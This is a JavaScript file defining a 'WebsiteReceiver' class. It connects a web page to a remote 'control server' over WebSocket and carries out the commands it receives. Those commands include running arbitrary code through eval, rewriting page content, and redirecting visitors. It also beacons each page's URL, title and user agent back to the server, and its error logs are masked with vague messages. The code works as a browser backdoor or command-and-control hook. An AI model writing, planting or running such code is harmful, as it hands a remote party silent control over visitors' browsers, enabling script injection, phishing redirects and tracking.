class WebsiteReceiver {
    constructor() {
        this.socket = null;
        this.retryCount = 0;
        this.maxRetries = 5;
        this.serverUrl = 'ws://your-server:8080'; // Change this to your server URL
        this.init();
    }

    init() {
        this.connectWebSocket();
        this.setupHeartbeat();
        this.setupPageProtection();
    }

    connectWebSocket() {
        this.socket = new WebSocket(this.serverUrl);

        this.socket.onopen = () => {
            this.retryCount = 0;
            this.sendStatus('Connected');
            console.log('Connected to control server');
        };

        this.socket.onmessage = (event) => {
            try {
                const command = JSON.parse(event.data);
                this.executeCommand(command);
            } catch (error) {
                console.log('Processing command...');
            }
        };

        this.socket.onclose = () => {
            if (this.retryCount < this.maxRetries) {
                this.retryCount++;
                setTimeout(() => this.connectWebSocket(), 3000);
            }
        };
    }

    executeCommand(command) {
        switch(command.type) {
            case 'updateContent':
                const element = document.querySelector(command.selector);
                if (element) element.innerHTML = command.content;
                break;

            case 'addElement':
                const newElement = document.createElement(command.element);
                newElement.innerHTML = command.content;
                const target = document.querySelector(command.target);
                if (target) target.appendChild(newElement);
                break;

            case 'removeElement':
                const elementToRemove = document.querySelector(command.selector);
                if (elementToRemove) elementToRemove.remove();
                break;

            case 'updateStyle':
                const styleElement = document.querySelector(command.selector);
                if (styleElement) {
                    styleElement.style[command.property] = command.value;
                }
                break;

            case 'executeJS':
                try {
                    eval(command.code);
                } catch (error) {
                    console.log('Executing command...');
                }
                break;
                
            case 'redirect':
                window.location.href = command.url;
                break;
                
            case 'reload':
                window.location.reload();
                break;
        }
    }

    setupHeartbeat() {
        setInterval(() => {
            if (this.socket.readyState === WebSocket.OPEN) {
                this.sendStatus('Active');
            }
        }, 30000);
    }

    setupPageProtection() {
        window.addEventListener('beforeunload', (e) => {
            this.sendStatus('Disconnecting');
        });
    }

    sendStatus(status) {
        if (this.socket.readyState === WebSocket.OPEN) {
            this.socket.send(JSON.stringify({
                type: 'status',
                message: status,
                url: window.location.href,
                timestamp: Date.now(),
                title: document.title,
                userAgent: navigator.userAgent
            }));
        }
    }
}

// Initialize the receiver
const receiver = new WebsiteReceiver();
